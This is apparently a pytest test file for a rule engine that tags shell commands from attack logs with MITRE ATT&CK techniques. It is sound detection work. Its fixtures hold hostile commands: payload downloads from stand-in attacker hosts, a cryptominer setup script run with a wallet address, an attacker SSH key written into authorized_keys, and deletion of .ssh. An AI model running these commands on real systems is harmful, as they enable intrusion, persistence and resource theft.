import pytest

from app.services.compaction import CompactedCommand
from app.services.mitre.catalog import is_known_technique, load_catalog
from app.services.mitre.rules import apply_rules, load_rules

POSITIVE = [
    ("wget http://198.51.100.7/x.sh", "T1105"),
    ("curl -O https://evil.example/payload", "T1105"),
    ("chmod 777 malicious_script", "T1222.002"),
    ("chmod +x payload", "T1222.002"),
    ("uname -a", "T1082"),
    ("cat /proc/cpuinfo", "T1082"),
    ("cat /etc/passwd", "T1003.008"),
    ('echo "ssh-rsa AAAA" >> .ssh/authorized_keys', "T1098.004"),
    ("sh setup_c3pool_miner.sh WALLET", "T1496"),
    ("rm -rf .ssh", "T1070.004"),
    ("ps aux", "T1057"),
    ("netstat -tulpn", "T1049"),
]

NEGATIVE = [
    ("echo wget is a tool", "T1105"),
    ("ls -la", "T1222.002"),
    ("cd /tmp", "T1082"),
    ("cat notes.txt", "T1003.008"),
]


def _hit_ids(command_text: str) -> set[str]:
    command = CompactedCommand(
        event_id="e1", timestamp="2026-08-20T10:00:00Z", command=command_text
    )
    hits, _ = apply_rules([command])
    return {h.rule.id for h in hits}


@pytest.mark.parametrize(("command", "technique"), POSITIVE)
def test_rule_matches_expected_command(command: str, technique: str) -> None:
    assert technique in _hit_ids(command)


@pytest.mark.parametrize(("command", "technique"), NEGATIVE)
def test_rule_does_not_over_match(command: str, technique: str) -> None:
    assert technique not in _hit_ids(command)


def test_every_rule_id_exists_in_the_attack_catalog() -> None:
    for rule in load_rules():
        assert is_known_technique(rule.id), f"{rule.id} is not a real ATT&CK technique"


def test_rule_names_and_tactics_match_the_catalog() -> None:
    catalog = load_catalog()
    for rule in load_rules():
        entry = catalog[rule.id]
        assert rule.tactic == entry.tactic, f"{rule.id} tactic drifted from catalog"


def test_unmatched_commands_are_returned_for_llm_gapfill() -> None:
    commands = [
        CompactedCommand(event_id="e1", timestamp="t", command="wget http://x/y"),
        CompactedCommand(event_id="e2", timestamp="t", command="dmidecode -s system-manufacturer"),
    ]
    hits, unmatched = apply_rules(commands)

    assert {h.rule.id for h in hits} == {"T1105"}
    assert [c.event_id for c in unmatched] == ["e2"]


def test_hits_carry_the_citing_event_id() -> None:
    commands = [
        CompactedCommand(
            event_id="seed-botnet-01-008",
            timestamp="2026-08-20T10:00:20Z",
            command="wget http://198.51.100.7/malicious_script",
        )
    ]
    hits, _ = apply_rules(commands)

    assert hits[0].event_id == "seed-botnet-01-008"
    assert hits[0].command == "wget http://198.51.100.7/malicious_script"


def test_reading_etc_passwd_is_not_mistaken_for_account_access_removal() -> None:
    """Regression: a bare `passwd` pattern also matches inside "/etc/passwd",
    which would wrongly tag a read-only recon command (T1003.008) with
    T1531 (Account Access Removal). Viewing the file is not disabling an
    account; only invoking the `passwd` command is.
    """
    assert _hit_ids("cat /etc/passwd") == {"T1003.008"}
    assert _hit_ids("cat /etc/passwd.bak") == {"T1003.008"}
    assert "T1531" in _hit_ids("passwd root")
    assert "T1531" in _hit_ids('echo -e "hacked123" | passwd')


# Fix round 2: reference-vs-execution over-matching. A trigger word appearing
# inside an echo argument, a quoted string, a shell comment, a grep pattern,
# or a filename argument to ls/find/cat is DATA, not an invocation of the
# tool, and must not earn provenance OBSERVED. `find / -name authorized_keys`
# and `ls -la ~/.ssh/authorized_keys` are deliberate exceptions: T1083 (File
# and Directory Discovery) is unrelated, pre-existing, correct behavior --
# literally running `ls`/`find` on a path IS discovery regardless of which
# filename is being searched for or listed. The only thing being asserted
# absent in those two rows is T1098.004.
ADVERSARIAL_NEGATIVE: list[tuple[str, set[str]]] = [
    ('echo "download with wget http://x"', set()),
    ("cat readme.txt # see wget http://example.com", set()),
    ('grep -r "wget http://" /var/log', set()),
    ("echo chmod 777", set()),
    ('echo "chmod 777 test"', set()),
    ("grep uname script.sh", set()),
    ("ls -la ~/.ssh/authorized_keys", {"T1083"}),
    ("find / -name authorized_keys", {"T1083"}),
    ("cat /etc/ssh/sshd_config | grep authorized_keys", set()),
]


@pytest.mark.parametrize(("command", "expected_hits"), ADVERSARIAL_NEGATIVE)
def test_reference_is_not_mistaken_for_execution(command: str, expected_hits: set[str]) -> None:
    assert _hit_ids(command) == expected_hits


COMMAND_POSITION_POSITIVE = [
    ("cd /tmp && wget http://198.51.100.7/x", "T1105"),
    ("cd /tmp && id", "T1033"),
    ('echo "ssh-rsa AAAA" >> .ssh/authorized_keys', "T1098.004"),
]


@pytest.mark.parametrize(("command", "technique"), COMMAND_POSITION_POSITIVE)
def test_command_position_anchoring_still_detects_real_chained_commands(
    command: str, technique: str
) -> None:
    """Anchoring a trigger to "start of command or right after a chain
    operator" must not break detection of a real technique invoked after
    `&&`/`;`/`|` -- it should, if anything, catch MORE of these than a bare
    `^` anchor would (e.g. `cd /tmp && id` did not match T1033 before this
    fix because the old pattern only anchored to the very start of the
    string).
    """
    assert technique in _hit_ids(command)


def test_ssh_authorized_keys_requires_a_write_not_a_reference() -> None:
    """T1098.004's only trigger is the literal string "authorized_keys",
    with no verb requirement at all -- the weakest rule in the file. Reading,
    listing, or searching for the file must not match; only a redirect or
    `tee` writing into it (i.e. actually installing a key) should.
    """
    assert "T1098.004" not in _hit_ids("cat ~/.ssh/authorized_keys")
    assert "T1098.004" not in _hit_ids("ls -la ~/.ssh/authorized_keys")
    assert "T1098.004" not in _hit_ids("find / -name authorized_keys")
    assert "T1098.004" not in _hit_ids("cat /etc/ssh/sshd_config | grep authorized_keys")
    assert "T1098.004" in _hit_ids('echo "ssh-rsa AAAA" >> .ssh/authorized_keys')
    assert "T1098.004" in _hit_ids("cat id_rsa.pub | tee -a ~/.ssh/authorized_keys")


SEED_CORPUS_COMMANDS: list[tuple[str, frozenset[str]]] = [
    ("uname -a", frozenset({"T1082"})),
    ("cat /proc/cpuinfo", frozenset({"T1082"})),
    ("free -m", frozenset({"T1082"})),
    ("cd /tmp", frozenset()),
    ("wget http://198.51.100.7/malicious_script", frozenset({"T1105"})),
    ("chmod 777 malicious_script", frozenset({"T1222.002"})),
    ("sh malicious_script", frozenset()),
    ("nproc", frozenset({"T1082"})),
    (
        "wget https://raw.githubusercontent.com/c3pool/xmrig_setup/master/setup_c3pool_miner.sh",
        frozenset({"T1105", "T1496"}),
    ),
    (
        "sh setup_c3pool_miner.sh 4AB31XZu3bKeUWtwGQ43ZadTKCfCzq3wra6yNbKdsucpRfgofJP",
        frozenset({"T1496", "T1059.004"}),
    ),
    ('echo -e "hacked123" | passwd', frozenset({"T1531"})),
    ("ls -la", frozenset({"T1083"})),
    ("cat /etc/os-release", frozenset({"T1082"})),
    ("ps aux", frozenset({"T1057"})),
    ("netstat -tulpn", frozenset({"T1049"})),
    ("uptime", frozenset({"T1082"})),
    ("id", frozenset({"T1033"})),
    ("cd home && rm -rf .ssh", frozenset({"T1070.004"})),
    ("mkdir .ssh", frozenset()),
    (
        'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7attacker" >> .ssh/authorized_keys',
        frozenset({"T1098.004"}),
    ),
    ("chmod -R go= home/.ssh && cd home", frozenset({"T1222.002"})),
    ("dmidecode -s system-manufacturer", frozenset()),
    ("cat /sys/class/dmi/id/product_name", frozenset()),
    ("ip route show default", frozenset()),
    ("systemctl list-units --type=service --state=running", frozenset()),
]


@pytest.mark.parametrize(("command", "expected_hits"), SEED_CORPUS_COMMANDS)
def test_seed_corpus_hits_are_unchanged_by_command_position_anchoring(
    command: str, expected_hits: frozenset[str]
) -> None:
    """Every distinct command drawn from the six seed corpus fixtures must
    produce exactly the same rule-hit set after command-position anchoring
    as it did before. Anchoring only removes matches where a verb wasn't in
    command position (a case that never occurs in the seed corpus) or adds
    matches after a chain operator (also not present here except `id` and
    `rm`, which were already in command position) -- so no seed command's
    hit set is expected to change.
    """
    assert _hit_ids(command) == set(expected_hits)
